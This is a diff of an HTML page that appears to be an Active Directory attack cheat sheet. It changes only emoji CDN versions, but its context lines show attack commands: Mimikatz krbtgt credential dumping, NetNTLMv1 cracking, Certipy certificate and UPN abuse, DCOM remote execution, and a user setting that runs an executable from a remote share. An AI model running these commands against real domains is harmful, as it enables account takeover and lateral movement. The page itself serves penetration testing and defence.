@@ -9706,7 +9706,7 @@
 <li>Changing a computer's AD password to null</li>
 <li>From password change to domain admin</li>
 <li>
-<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> reset the computer's AD password in a proper way to avoid any Deny of Service</p>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> reset the computer's AD password in a proper way to avoid any Deny of Service</p>
 </li>
 <li>
 <p><code>cve-2020-1472-exploit.py</code> - Python script from <a href="https://github.com/dirkjanm">dirkjanm</a>
@@ -10190,10 +10190,10 @@ WebDav client <strong>must</strong> be activated on exploited target. By default
 <blockquote>
 <p>Creators of a GPO are automatically granted explicit Edit settings, delete, modify security, which manifests as CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner</p>
 </blockquote>
-<p><img alt="🚩" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/1f6a9.svg" title=":triangular_flag_on_post:" /> GPO Priorization : Organization Unit &gt; Domain &gt; Site &gt; Local</p>
+<p><img alt="🚩" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/1f6a9.svg" title=":triangular_flag_on_post:" /> GPO Priorization : Organization Unit &gt; Domain &gt; Site &gt; Local</p>
 <p>GPO are stored in the DC in <code>\\&lt;domain.dns&gt;\SYSVOL\&lt;domain.dns&gt;\Policies\&lt;GPOName&gt;\</code>, inside two folders <strong>User</strong> and <strong>Machine</strong>.
 If you have the right to edit the GPO you can connect to the DC and replace the files. Planned Tasks are located at <code>Machine\Preferences\ScheduledTasks</code>.</p>
-<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> Domain members refresh group policy settings every 90 minutes with a random offset of 0 to 30 minutes but it can locally be forced with the following command: <code>gpupdate /force</code>. </p>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> Domain members refresh group policy settings every 90 minutes with a random offset of 0 to 30 minutes but it can locally be forced with the following command: <code>gpupdate /force</code>. </p>
 <h3 id="find-vulnerable-gpo">Find vulnerable GPO</h3>
 <p>Look a GPLink where you have the <strong>Write</strong> right.</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a><span class="nb">Get-DomainObjectAcl</span> <span class="n">-Identity</span> <span class="s2">&quot;SuperSecureGPO&quot;</span> <span class="n">-ResolveGUIDs</span> <span class="p">|</span>  <span class="nb">Where-Object</span> <span class="p">{(</span><span class="nv">$_</span><span class="p">.</span><span class="n">ActiveDirectoryRights</span><span class="p">.</span><span class="n">ToString</span><span class="p">()</span> <span class="o">-match</span> <span class="s2">&quot;GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner&quot;</span><span class="p">)}</span>
@@ -10291,7 +10291,7 @@ If you have the right to edit the GPO you can connect to the DC and replace the 
 </code></pre></div></li>
 </ul>
 <blockquote>
-<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> OPSEC NOTE: Replication is always done between 2 Computers. Doing a DCSync from a user account can raise alerts.</p>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> OPSEC NOTE: Replication is always done between 2 Computers. Doing a DCSync from a user account can raise alerts.</p>
 </blockquote>
 <h3 id="volume-shadow-copy">Volume Shadow Copy</h3>
 <p>The VSS is a Windows service that allows users to create snapshots or backups of their data at a specific point in time. Attackers can abuse this service to access and copy sensitive data, even if it is currently being used or locked by another process.</p>
@@ -10322,7 +10322,7 @@ If you have the right to edit the GPO you can connect to the DC and replace the 
 </ul>
 <h3 id="using-mimikatz-sekurlsa">Using Mimikatz sekurlsa</h3>
 <p>Dumps credential data in an Active Directory domain when run on a Domain Controller.
-<img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> Requires administrator access with debug or Local SYSTEM rights</p>
+<img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> Requires administrator access with debug or Local SYSTEM rights</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-99-1" name="__codelineno-99-1" href="#__codelineno-99-1"></a><span class="n">sekurlsa</span><span class="p">::</span><span class="n">krbtgt</span>
 <a id="__codelineno-99-2" name="__codelineno-99-2" href="#__codelineno-99-2"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">lsa</span> <span class="p">/</span><span class="n">inject</span> <span class="p">/</span><span class="n">name</span><span class="p">:</span><span class="n">krbtgt</span>
 </code></pre></div>
@@ -10343,7 +10343,7 @@ If you have the right to edit the GPO you can connect to the DC and replace the 
 <a id="__codelineno-100-8" name="__codelineno-100-8" href="#__codelineno-100-8"></a><span class="p">$</span> <span class="n">python2</span> <span class="n">statsgen</span><span class="p">.</span><span class="n">py</span> <span class="p">../</span><span class="n">hashcat</span><span class="p">.</span><span class="n">potfile</span> <span class="n">-o</span> <span class="n">hashcat</span><span class="p">.</span><span class="n">mask</span>
 <a id="__codelineno-100-9" name="__codelineno-100-9" href="#__codelineno-100-9"></a><span class="p">$</span> <span class="n">python2</span> <span class="n">maskgen</span><span class="p">.</span><span class="n">py</span> <span class="n">hashcat</span><span class="p">.</span><span class="n">mask</span> <span class="p">-</span><span class="n">-targettime</span> <span class="n">3600</span> <span class="p">-</span><span class="n">-optindex</span> <span class="n">-q</span> <span class="n">-o</span> <span class="n">hashcat_1H</span><span class="p">.</span><span class="n">hcmask</span>
 </code></pre></div>
-<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> If the password is not a confidential data (challenges/ctf), you can use online "cracker" like :
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> If the password is not a confidential data (challenges/ctf), you can use online "cracker" like :
 - <a href="https://hashmob.net">hashmob.net</a>
 - <a href="https://crackstation.net">crackstation.net</a>
 - <a href="https://hashes.com/en/decrypt/hash">hashes.com</a></p>
@@ -10593,7 +10593,7 @@ You can remotely query every machines on the network to get a list of the users'
 <blockquote>
 <p>One notable difference between a <strong>Golden Ticket</strong> attack and the <strong>Golden GMSA</strong> attack is that they no way of rotating the KDS root key secret. Therefore, if a KDS root key is compromised, there is no way to protect the gMSAs associated with it.</p>
 </blockquote>
-<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> You can't "force reset" a gMSA password, because a gMSA's password never changes. The password is derived from the KDS root key and <code>ManagedPasswordIntervalInDays</code>, so every Domain Controller can at any time compute what the password is, what it used to be, and what it will be at any point in the future.</p>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> You can't "force reset" a gMSA password, because a gMSA's password never changes. The password is derived from the KDS root key and <code>ManagedPasswordIntervalInDays</code>, so every Domain Controller can at any time compute what the password is, what it used to be, and what it will be at any point in the future.</p>
 <ul>
 <li>Using <a href="https://github.com/Semperis/GoldenGMSA">GoldenGMSA</a>
     <div class="highlight"><pre><span></span><code><a id="__codelineno-131-1" name="__codelineno-131-1" href="#__codelineno-131-1"></a><span class="c"># Enumerate all gMSAs</span>
@@ -10954,7 +10954,7 @@ You can remotely query every machines on the network to get a list of the users'
 <p>In September 2022 a vulnerability was discovered by <a href="https://exploit.ph/">Charlie Clark</a>, ST (Service Tickets) can be obtained through KRB_AS_REQ request without having to control any Active Directory account. If a principal can authenticate without pre-authentication (like AS-REP Roasting attack), it is possible to use it to launch an <strong>KRB_AS_REQ</strong> request and trick the request to ask for a <strong>ST</strong> instead of a <strong>encrypted TGT</strong>, by modifying the <strong>sname</strong> attribute in the req-body part of the request.</p>
 </blockquote>
 <p>The technique is fully explained in this article: <a href="https://www.semperis.com/blog/new-attack-paths-as-requested-sts/">Semperis blog post</a>.</p>
-<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> You must provide a list of users because we don't have a valid account to query the LDAP using this technique.</p>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> You must provide a list of users because we don't have a valid account to query the LDAP using this technique.</p>
 <ul>
 <li><a href="https://github.com/fortra/impacket/pull/1413">impacket/GetUserSPNs.py from PR #1413</a>
   <div class="highlight"><pre><span></span><code><a id="__codelineno-151-1" name="__codelineno-151-1" href="#__codelineno-151-1"></a><span class="n">GetUserSPNs</span><span class="p">.</span><span class="n">py</span> <span class="n">-no-preauth</span> <span class="s2">&quot;NO_PREAUTH_USER&quot;</span> <span class="n">-usersfile</span> <span class="s2">&quot;LIST_USERS&quot;</span> <span class="n">-dc-host</span> <span class="s2">&quot;dc.domain.local&quot;</span> <span class="s2">&quot;domain.local&quot;</span><span class="p">/</span>
@@ -11050,7 +11050,7 @@ You can remotely query every machines on the network to get a list of the users'
 <blockquote>
 <p>Net-NTLMv1 (NTLMv1) authentication tokens are used for network authentication (they are derived from a challenge/response DES-based algorithm with the user's NT-hash as symetric keys. </p>
 </blockquote>
-<p><img alt="ℹ" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/2139.svg" title=":information_source:" /> : Coerce a callback using PetitPotam or SpoolSample on an affected machine and downgrade the authentication to <strong>NetNTLMv1 Challenge/Response authentication</strong>. This uses the outdated encryption method DES to protect the NT/LM Hashes.</p>
+<p><img alt="ℹ" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/2139.svg" title=":information_source:" /> : Coerce a callback using PetitPotam or SpoolSample on an affected machine and downgrade the authentication to <strong>NetNTLMv1 Challenge/Response authentication</strong>. This uses the outdated encryption method DES to protect the NT/LM Hashes.</p>
 <p><strong>Requirements</strong>:
 * LmCompatibilityLevel = 0x1: Send LM &amp; NTLM (<code>reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel</code>)</p>
 <p><strong>Exploitation</strong>:
@@ -11093,10 +11093,10 @@ You can remotely query every machines on the network to get a list of the users'
 <a id="__codelineno-166-4" name="__codelineno-166-4" href="#__codelineno-166-4"></a><span class="n">hashcat</span> <span class="n">-m</span> <span class="n">14000</span> <span class="n">-a</span> <span class="n">3</span> <span class="n">inputs</span><span class="p">.</span><span class="n">txt</span> <span class="p">-</span><span class="n">-hex-charset</span> <span class="p">-</span><span class="n">1</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">hashcat</span><span class="p">/</span><span class="n">charsets</span><span class="p">/</span><span class="n">DES_full</span><span class="p">.</span><span class="n">hcchr</span> <span class="k">?</span><span class="n">1</span><span class="k">?</span><span class="n">1</span><span class="k">?</span><span class="n">1</span><span class="k">?</span><span class="n">1</span><span class="k">?</span><span class="n">1</span><span class="k">?</span><span class="n">1</span><span class="k">?</span><span class="n">1</span><span class="k">?</span><span class="n">1</span> <span class="c"># for NetNTLMv1(-ESS/SSP) to DES-keys (KPA-attack) of user/computer account with 100% success rate, then regenerate NT-hash with these DES-keys on https://shuck.sh/converter.php.</span>
 </code></pre></div>
 * Now you can DCSync using the Pass-The-Hash with the DC machine account</p>
-<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> NetNTLMv1 with ESS / SSP (Extended Session Security / Security Support Provider) changes the final challenge by adding a new alea (!= <code>1122334455667788</code>, so chargeable on <a href="https://crack.sh/">Crack.Sh</a>).</p>
-<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> NetNTLMv1 format is <code>login::domain:lmresp:ntresp:clientChall</code>. If the <code>lmresp</code> contains a <strong>0's-padding</strong> this means that the token is protected by <strong>ESS/SSP</strong>.</p>
-<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> NetNTLMv1 final challenge is the Responder's challenge itself (<code>1122334455667788</code>) when there is no ESS/SSP. If ESS/SSP is enabled, the final challenge is the first 8 bytes of the MD5 hash from the concatenation of the client challenge and server challenge. The details of the algorithmic generation of a NetNTLMv1 are illustrated on the <a href="https://shuck.sh/generator.php">Shuck.Sh Generator</a> and detailed in <a href="https://connect.ed-diamond.com/misc/misc-128/shuck-hash-before-trying-to-crack-it">MISCMag#128</a>.</p>
-<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> If you get some tokens from other tools (<a href="https://github.com/OpenSecurityResearch/hostapd-wpe">hostapd-wpe</a> or <a href="https://github.com/moxie0/chapcrack">chapcrack</a>) in other formats, like tokens starting with the prefix <code>$MSCHAPv2$</code>, <code>$NETNTLM$</code> or <code>$99$</code>, they correspond to a classic NetNTLMv1 and can be converted from one format to another <a href="https://shuck.sh/converter.php">here</a>.</p>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> NetNTLMv1 with ESS / SSP (Extended Session Security / Security Support Provider) changes the final challenge by adding a new alea (!= <code>1122334455667788</code>, so chargeable on <a href="https://crack.sh/">Crack.Sh</a>).</p>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> NetNTLMv1 format is <code>login::domain:lmresp:ntresp:clientChall</code>. If the <code>lmresp</code> contains a <strong>0's-padding</strong> this means that the token is protected by <strong>ESS/SSP</strong>.</p>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> NetNTLMv1 final challenge is the Responder's challenge itself (<code>1122334455667788</code>) when there is no ESS/SSP. If ESS/SSP is enabled, the final challenge is the first 8 bytes of the MD5 hash from the concatenation of the client challenge and server challenge. The details of the algorithmic generation of a NetNTLMv1 are illustrated on the <a href="https://shuck.sh/generator.php">Shuck.Sh Generator</a> and detailed in <a href="https://connect.ed-diamond.com/misc/misc-128/shuck-hash-before-trying-to-crack-it">MISCMag#128</a>.</p>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> If you get some tokens from other tools (<a href="https://github.com/OpenSecurityResearch/hostapd-wpe">hostapd-wpe</a> or <a href="https://github.com/moxie0/chapcrack">chapcrack</a>) in other formats, like tokens starting with the prefix <code>$MSCHAPv2$</code>, <code>$NETNTLM$</code> or <code>$99$</code>, they correspond to a classic NetNTLMv1 and can be converted from one format to another <a href="https://shuck.sh/converter.php">here</a>.</p>
 <p><strong>Mitigations</strong>: </p>
 <ul>
 <li>Set the Lan Manager authentication level to <code>Send NTLMv2 responses only. Refuse LM &amp; NTLM</code></li>
@@ -11605,7 +11605,7 @@ Jane@corp.local is allowed to enroll in the certificate template ESC9 that speci
 <li>Obtain the hash of Jane with Shadow Credentials (using our GenericWrite)
     <div class="highlight"><pre><span></span><code><a id="__codelineno-210-1" name="__codelineno-210-1" href="#__codelineno-210-1"></a><span class="n">certipy</span> <span class="n">shadow</span> <span class="n">auto</span> <span class="n">-username</span> <span class="n">John</span><span class="nv">@corp</span><span class="p">.</span><span class="n">local</span> <span class="n">-p</span> <span class="n">Passw0rd</span> <span class="n">-account</span> <span class="n">Jane</span>
 </code></pre></div></li>
-<li>Change the <strong>userPrincipalName</strong> of Jane to be Administrator. <img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> leave the <code>@corp.local</code> part
+<li>Change the <strong>userPrincipalName</strong> of Jane to be Administrator. <img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> leave the <code>@corp.local</code> part
     <div class="highlight"><pre><span></span><code><a id="__codelineno-211-1" name="__codelineno-211-1" href="#__codelineno-211-1"></a><span class="n">certipy</span> <span class="n">account</span> <span class="n">update</span> <span class="n">-username</span> <span class="n">John</span><span class="nv">@corp</span><span class="p">.</span><span class="n">local</span> <span class="n">-password</span> <span class="n">Passw0rd</span> <span class="n">-user</span> <span class="n">Jane</span> <span class="n">-upn</span> <span class="n">Administrator</span>
 </code></pre></div></li>
 <li>Request the vulnerable certificate template ESC9 from Jane's account.
@@ -11718,7 +11718,7 @@ Jane@corp.local is allowed to enroll in the certificate template ESC9 that speci
 <blockquote>
 <p>Add <strong>Key Credentials</strong> to the attribute <code>msDS-KeyCredentialLink</code> of the target user/computer object and then perform Kerberos authentication as that account using PKINIT to obtain a TGT for that user.  When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has knowledge of the matching private key, and a TGT will be sent if there is a match.</p>
 </blockquote>
-<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> User objects can't edit their own <code>msDS-KeyCredentialLink</code> attribute while computer objects can. Computer objects can edit their own msDS-KeyCredentialLink attribute but can only add a KeyCredential if none already exists</p>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> User objects can't edit their own <code>msDS-KeyCredentialLink</code> attribute while computer objects can. Computer objects can edit their own msDS-KeyCredentialLink attribute but can only add a KeyCredential if none already exists</p>
 <p><strong>Requirements</strong>:
 * Domain Controller on (at least) Windows Server 2016
 * Domain must have Active Directory <code>Certificate Services</code> and <code>Certificate Authority</code> configured
@@ -11812,7 +11812,7 @@ E.g: if someone tries to delete this user from the Domain Admins in an hour or l
 <blockquote>
 <p>It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM).</p>
 </blockquote>
-<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> Require privileges to restart the DNS service.</p>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> Require privileges to restart the DNS service.</p>
 <ul>
 <li>Enumerate members of DNSAdmins group
     <div class="highlight"><pre><span></span><code><a id="__codelineno-231-1" name="__codelineno-231-1" href="#__codelineno-231-1"></a><span class="nb">Get-NetGroupMember</span> <span class="n">-GroupName</span> <span class="s2">&quot;DNSAdmins&quot;</span>
@@ -12019,7 +12019,7 @@ E.g: if someone tries to delete this user from the Domain Admins in an hour or l
 <p>Now let’s say you are in an Active Directory environment that still actively uses a Windows Server version that has RCM enabled, or that you are able to enable RCM on a compromised RDSH, what can we actually do ? Well each user object in Active Directory has a tab called ‘Environment’.</p>
 <p>This tab includes settings that, among other things, can be used to change what program is started when a user connects over the Remote Desktop Protocol (RDP) to a TS/RDSH in place of the normal graphical environment. The settings in the ‘Starting program’ field basically function like a windows shortcut, allowing you to supply either a local or remote (UNC) path to an executable which is to be started upon connecting to the remote host. During the logon process these values will be queried by the RCM process and run whatever executable is defined. - https://sensepost.com/blog/2020/ace-to-rce/</p>
 </blockquote>
-<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> The RCM is only active on Terminal Servers/Remote Desktop Session Hosts. The RCM has also been disabled on recent version of Windows (&gt;2016), it requires a registry change to re-enable.</p>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> The RCM is only active on Terminal Servers/Remote Desktop Session Hosts. The RCM has also been disabled on recent version of Windows (&gt;2016), it requires a registry change to re-enable.</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-251-1" name="__codelineno-251-1" href="#__codelineno-251-1"></a><span class="nv">$UserObject</span> <span class="p">=</span> <span class="p">(</span><span class="no">[ADSI]</span><span class="p">(</span><span class="s2">&quot;LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld&quot;</span><span class="p">))</span>
 <a id="__codelineno-251-2" name="__codelineno-251-2" href="#__codelineno-251-2"></a><span class="nv">$UserObject</span><span class="p">.</span><span class="n">TerminalServicesInitialProgram</span> <span class="p">=</span> <span class="s2">&quot;\\1.2.3.4\share\file.exe&quot;</span>
 <a id="__codelineno-251-3" name="__codelineno-251-3" href="#__codelineno-251-3"></a><span class="nv">$UserObject</span><span class="p">.</span><span class="n">TerminalServicesWorkDirectory</span> <span class="p">=</span> <span class="s2">&quot;C:\&quot;</span>
@@ -12190,7 +12190,7 @@ Or<br />
 <a id="__codelineno-268-4" name="__codelineno-268-4" href="#__codelineno-268-4"></a><span class="nv">$item</span><span class="p">.</span><span class="n">Document</span><span class="p">.</span><span class="n">Application</span><span class="p">.</span><span class="n">ShellExecute</span><span class="p">(</span><span class="s2">&quot;cmd.exe&quot;</span><span class="p">,</span><span class="s2">&quot;/c calc.exe&quot;</span><span class="p">,</span><span class="s2">&quot;C:\windows\system32&quot;</span><span class="p">,</span><span class="nv">$null</span><span class="p">,</span><span class="n">0</span><span class="p">)</span>
 </code></pre></div>
 <h3 id="dcom-via-shellbrowserwindow">DCOM via ShellBrowserWindow</h3>
-<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> Windows 10 only, the object doesn't exists in Windows 7</p>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> Windows 10 only, the object doesn't exists in Windows 7</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-269-1" name="__codelineno-269-1" href="#__codelineno-269-1"></a><span class="nv">$com</span> <span class="p">=</span> <span class="no">[Type]</span><span class="p">::</span><span class="n">GetTypeFromCLSID</span><span class="p">(</span><span class="s1">&#39;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#39;</span><span class="p">,</span><span class="s2">&quot;10.10.10.1&quot;</span><span class="p">)</span>
 <a id="__codelineno-269-2" name="__codelineno-269-2" href="#__codelineno-269-2"></a><span class="nv">$obj</span> <span class="p">=</span> <span class="no">[System.Activator]</span><span class="p">::</span><span class="n">CreateInstance</span><span class="p">(</span><span class="nv">$com</span><span class="p">)</span>
 <a id="__codelineno-269-3" name="__codelineno-269-3" href="#__codelineno-269-3"></a><span class="nv">$obj</span><span class="p">.</span><span class="n">Application</span><span class="p">.</span><span class="n">ShellExecute</span><span class="p">(</span><span class="s2">&quot;cmd.exe&quot;</span><span class="p">,</span><span class="s2">&quot;/c calc.exe&quot;</span><span class="p">,</span><span class="s2">&quot;C:\windows\system32&quot;</span><span class="p">,</span><span class="nv">$null</span><span class="p">,</span><span class="n">0</span><span class="p">)</span>
@@ -12223,7 +12223,7 @@ Or<br />
 </code></pre></div></li>
 </ul>
 <h3 id="exploit-trusts-between-domains">Exploit trusts between domains</h3>
-<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> Require a Domain-Admin level access to the current domain.</p>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> Require a Domain-Admin level access to the current domain.</p>
 <table>
 <thead>
 <tr>
@@ -12346,7 +12346,7 @@ Mimikatz, adding the SID for the target domain's enterprise admins group to our 
 <p>The user sends a ST to access the service, along with their TGT, and then the service can use the user's TGT to request a ST for the user to any other service and impersonate the user. - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html </p>
 <p>When a user authenticates to a computer that has unrestricted kerberos delegation privilege turned on, authenticated user's TGT ticket gets saved to that computer's memory. </p>
 </blockquote>
-<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> Unconstrained delegation used to be the only option available in Windows 2000</p>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> Unconstrained delegation used to be the only option available in Windows 2000</p>
 <blockquote>
 <p><strong>Warning</strong>
 Remember to coerce to a HOSTNAME if you want a Kerberos Ticket</p>
@@ -12360,7 +12360,7 @@ Remember to coerce to a HOSTNAME if you want a Kerberos Ticket</p>
 - User must not be in the <strong>Protected Users</strong> group 
 - User must not have the flag <strong>Account is sensitive and cannot be delegated</strong></p>
 <h4 id="find-delegation">Find delegation</h4>
-<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> : Domain controllers usually have unconstrained delegation enabled.  <br />
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> : Domain controllers usually have unconstrained delegation enabled.  <br />
 Check the <code>TRUSTED_FOR_DELEGATION</code> property.</p>
 <ul>
 <li>
@@ -12605,7 +12605,7 @@ Check the <code>TRUSTED_FOR_DELEGATION</code> property.</p>
 <p>An attacker can impersonate users which are not allowed to be delegated. This includes members of the <strong>Protected Users</strong> group and any other users explicitly configured as <strong>sensitive and cannot be delegated</strong>.</p>
 <p>Patch is out on November 10, 2020, DC are most likely vulnerable until <a href="https://support.microsoft.com/en-us/help/4598347/managing-deployment-of-kerberos-s4u-changes-for-cve-2020-17049">February 2021</a>.</p>
 </blockquote>
-<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> Patched Error Message : <code>[-] Kerberos SessionError: KRB_AP_ERR_MODIFIED(Message stream modified)</code></p>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> Patched Error Message : <code>[-] Kerberos SessionError: KRB_AP_ERR_MODIFIED(Message stream modified)</code></p>
 <p>Requirements:
 * Service account's password hash 
 * Service account's with <code>Constrained Delegation</code> or <code>Resource Based Constrained Delegation</code>
@@ -12643,7 +12643,7 @@ Check the <code>TRUSTED_FOR_DELEGATION</code> property.</p>
 </code></pre></div>
 <h2 id="privexchange-attack">PrivExchange attack</h2>
 <p>Exchange your privileges for Domain Admin privs by abusing Exchange.  <br />
-<img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> You need a shell on a user account with a mailbox.</p>
+<img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> You need a shell on a user account with a mailbox.</p>
 <ol>
 <li>
 <p>Exchange server hostname or IP address</p>
@@ -12785,7 +12785,7 @@ Check the <code>TRUSTED_FOR_DELEGATION</code> property.</p>
 <blockquote>
 <p>Windows Server Update Services (WSUS) enables information technology administrators to deploy the latest Microsoft product updates. You can use WSUS to fully manage the distribution of updates that are released through Microsoft Update to computers on your network</p>
 </blockquote>
-<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> The payload must be a Microsoft signed binary and must point to a location on disk for the WSUS server to load that binary.</p>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> The payload must be a Microsoft signed binary and must point to a location on disk for the WSUS server to load that binary.</p>
 <ul>
 <li>
 <p><a href="https://github.com/nettitude/SharpWSUS">SharpWSUS</a></p>
